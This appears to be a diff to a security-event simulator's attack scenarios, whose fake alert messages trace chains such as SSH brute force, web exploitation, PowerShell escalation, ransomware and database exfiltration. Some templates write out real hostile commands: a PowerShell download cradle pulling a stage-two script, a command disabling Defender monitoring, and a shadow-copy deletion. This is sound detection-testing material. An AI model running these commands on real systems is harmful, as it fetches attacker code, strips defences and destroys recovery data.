@@ -34,43 +34,49 @@ ATTACKER_SOURCES = [
 SCENARIOS = [
     {
         "id": "scenario_credential_brute_force",
-        "name": "Credential Access: SSH/RDP Brute Force",
+        "name": "Credential Access: Password Spray & Brute Force Chain",
         "steps": [
             {
                 "event_type": "LOGIN_FAILURE",
                 "severity": "LOW",
-                "message_template": "Failed authentication attempt for user 'root' from {src_ip}",
+                "message_template": "Failed authentication attempt for user 'root' from {src_ip} via SSH",
                 "proto": "SSH", "port": 22
             },
             {
                 "event_type": "LOGIN_FAILURE",
                 "severity": "MEDIUM",
-                "message_template": "Repeated failed authentication for user 'administrator' from {src_ip}",
-                "proto": "SSH", "port": 22
-            },
-            {
-                "event_type": "LOGIN_FAILURE",
-                "severity": "MEDIUM",
-                "message_template": "High rate of failed logins (25 attempts in 10s) on user 'svc_backup'",
+                "message_template": "Password spraying detected across multiple service accounts (administrator, svc_backup, deploy) from {src_ip}",
                 "proto": "SSH", "port": 22
             },
             {
                 "event_type": "BRUTE_FORCE",
                 "severity": "CRITICAL",
-                "message_template": "SSH credential brute-force threshold exceeded (>50 attempts/min) from {src_ip}",
+                "message_template": "SSH credential brute-force threshold exceeded (>60 attempts/min) from {src_ip} targeting {target}",
                 "proto": "SSH", "port": 22
             },
             {
                 "event_type": "SUSPICIOUS_LOGIN",
                 "severity": "HIGH",
-                "message_template": "Successful login for 'svc_backup' immediately following brute-force attempts from {src_ip}",
+                "message_template": "Successful authentication for valid account 'svc_backup' following brute-force attempts from {src_ip}",
                 "proto": "SSH", "port": 22
+            },
+            {
+                "event_type": "POWERSHELL_EXECUTION",
+                "severity": "HIGH",
+                "message_template": "Remote interactive shell executed: powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBFAFgA...",
+                "proto": "SSH", "port": 22
+            },
+            {
+                "event_type": "C2_COMMUNICATION",
+                "severity": "CRITICAL",
+                "message_template": "Outbound HTTP C2 beaconing detected from {target} to drop listener host {src_ip} over port 8080",
+                "proto": "HTTP", "port": 8080
             }
         ]
     },
     {
         "id": "scenario_web_cve_exploitation",
-        "name": "Initial Access: Web Vulnerability Recon & Exploit",
+        "name": "Initial Access: Web Vulnerability Exploit (CVE-2023-34362)",
         "steps": [
             {
                 "event_type": "PORT_SCAN",
@@ -79,28 +85,88 @@ SCENARIOS = [
                 "proto": "TCP", "port": 80
             },
             {
-                "event_type": "SERVICE_ENUMERATION",
+                "event_type": "VULNERABILITY_SCAN",
                 "severity": "MEDIUM",
-                "message_template": "Automated web application vulnerability scan probing URI paths (/api, /admin) from {src_ip}",
+                "message_template": "Automated web application vulnerability scan probing URI paths (/api, /admin, /moveitisapi/moveitisapi.dll) from {src_ip}",
                 "proto": "HTTPS", "port": 443
             },
             {
                 "event_type": "SQL_INJECTION",
                 "severity": "HIGH",
-                "message_template": "SQL injection attempt detected in HTTP parameter 'id=UNION+SELECT' targeting {target}",
+                "message_template": "SQL injection payload detected in HTTP parameter 'id=UNION+SELECT' targeting {target}",
                 "proto": "HTTPS", "port": 443
             },
             {
                 "event_type": "EXPLOIT_ATTEMPT",
                 "severity": "CRITICAL",
-                "message_template": "Remote Code Execution exploit payload matching CVE-2023-34362 detected on {target}",
+                "message_template": "Remote Code Execution exploit payload matching CVE-2023-34362 executed on {target}",
                 "proto": "HTTPS", "port": 443
             },
             {
                 "event_type": "MALWARE_ALERT",
                 "severity": "CRITICAL",
-                "message_template": "Web shell file dropped in /var/www/uploads/shell.php and executed via web server process",
+                "message_template": "Web shell file dropped in /var/www/uploads/sys_check.php and executed via web server worker process",
                 "proto": "HTTPS", "port": 443
+            },
+            {
+                "event_type": "PRIVILEGE_ESCALATION",
+                "severity": "CRITICAL",
+                "message_template": "Local privilege escalation exploit executed via CVE-2024-3400 root escalation vector on {target}",
+                "proto": "HTTPS", "port": 443
+            }
+        ]
+    },
+    {
+        "id": "scenario_reconnaissance_port_scan",
+        "name": "Reconnaissance: Network Service Discovery & Vulnerability Scan",
+        "steps": [
+            {
+                "event_type": "PORT_SCAN",
+                "severity": "LOW",
+                "message_template": "High-velocity TCP SYN sweep detected across internal subnet from {src_ip} probing ports 21, 22, 80, 443, 445, 3389",
+                "proto": "TCP", "port": 445
+            },
+            {
+                "event_type": "SERVICE_ENUMERATION",
+                "severity": "MEDIUM",
+                "message_template": "Active service banner grabbing and RPC enumeration targeting {target} from {src_ip}",
+                "proto": "TCP", "port": 135
+            },
+            {
+                "event_type": "VULNERABILITY_SCAN",
+                "severity": "HIGH",
+                "message_template": "Unauthenticated vulnerability probe verifying unpatched SSL/TLS ciphers and exposed endpoints on {target}",
+                "proto": "HTTPS", "port": 443
+            }
+        ]
+    },
+    {
+        "id": "scenario_powershell_privilege_escalation",
+        "name": "Execution & Defense Evasion: PowerShell Injection & Privilege Escalation",
+        "steps": [
+            {
+                "event_type": "POWERSHELL_EXECUTION",
+                "severity": "HIGH",
+                "message_template": "Obfuscated PowerShell download cradle invoked: IEX (New-Object Net.WebClient).DownloadString('http://{src_ip}:8080/stage2.ps1')",
+                "proto": "HTTP", "port": 8080
+            },
+            {
+                "event_type": "DEFENSE_EVASION",
+                "severity": "CRITICAL",
+                "message_template": "Security control tampering: Set-MpPreference -DisableRealtimeMonitoring $true executed on {target}",
+                "proto": "RPC", "port": 445
+            },
+            {
+                "event_type": "PROCESS_INJECTION",
+                "severity": "CRITICAL",
+                "message_template": "Process memory injection into svchost.exe (PID: 1044) using VirtualAllocEx and WriteProcessMemory",
+                "proto": "LOCAL", "port": 0
+            },
+            {
+                "event_type": "PRIVILEGE_ESCALATION",
+                "severity": "CRITICAL",
+                "message_template": "Token elevation: Primary process security token elevated to NT AUTHORITY\\SYSTEM on {target}",
+                "proto": "LOCAL", "port": 0
             }
         ]
     },
@@ -111,25 +177,25 @@ SCENARIOS = [
             {
                 "event_type": "SUSPICIOUS_LOGIN",
                 "severity": "HIGH",
-                "message_template": "Off-hours RDP logon with privileged account from unusual IP {src_ip}",
+                "message_template": "Off-hours RDP logon with privileged domain administrator account from unusual source {src_ip}",
                 "proto": "RDP", "port": 3389
             },
             {
-                "event_type": "PRIVILEGE_ESCALATION",
-                "severity": "CRITICAL",
-                "message_template": "LSASS memory access / process injection detected attempting credential dump (T1003)",
-                "proto": "RPC", "port": 445
+                "event_type": "LATERAL_MOVEMENT",
+                "severity": "HIGH",
+                "message_template": "Administrative SMB network share access and remote service creation on {target} from {src_ip}",
+                "proto": "SMB", "port": 445
             },
             {
-                "event_type": "C2_COMMUNICATION",
-                "severity": "HIGH",
-                "message_template": "Outbound HTTP beaconing detected over port 8080 to test C2 listener",
-                "proto": "HTTP", "port": 8080
+                "event_type": "SHADOW_COPY_DELETION",
+                "severity": "CRITICAL",
+                "message_template": "Inhibit system recovery command executed: vssadmin.exe Delete Shadows /All /Quiet on {target}",
+                "proto": "RPC", "port": 445
             },
             {
                 "event_type": "RANSOMWARE_ACTIVITY",
                 "severity": "CRITICAL",
-                "message_template": "High-velocity file modification and encryption pattern detected on SMB share {target}",
+                "message_template": "High-velocity file modification and AES encryption pattern detected across storage volume {target}",
                 "proto": "SMB", "port": 445
             }
         ]
@@ -141,19 +207,25 @@ SCENARIOS = [
             {
                 "event_type": "LOGIN_FAILURE",
                 "severity": "LOW",
-                "message_template": "Database login failure for user 'postgres' from {src_ip}",
+                "message_template": "Database authentication failure for user 'postgres' from non-whitelisted IP {src_ip}",
                 "proto": "PostgreSQL", "port": 5432
             },
             {
                 "event_type": "SUSPICIOUS_LOGIN",
                 "severity": "HIGH",
-                "message_template": "Direct database connection established using administrative credentials from non-whitelisted host {src_ip}",
+                "message_template": "Direct PostgreSQL administrative session opened from untrusted staging subnet {src_ip}",
+                "proto": "PostgreSQL", "port": 5432
+            },
+            {
+                "event_type": "DATA_STAGING",
+                "severity": "HIGH",
+                "message_template": "Mass database dump: COPY INTO executed on customer records and staging archive /tmp/db_dump.7z",
                 "proto": "PostgreSQL", "port": 5432
             },
             {
                 "event_type": "DATA_EXFILTRATION",
                 "severity": "CRITICAL",
-                "message_template": "Mass query exfiltration: 4.8 GB transferred in 120 seconds to internal staging target",
+                "message_template": "High-volume unauthorized outbound transfer: 5.4 GB staged data exfiltrated via HTTPS POST to {src_ip}",
                 "proto": "HTTPS", "port": 443
             }
         ]
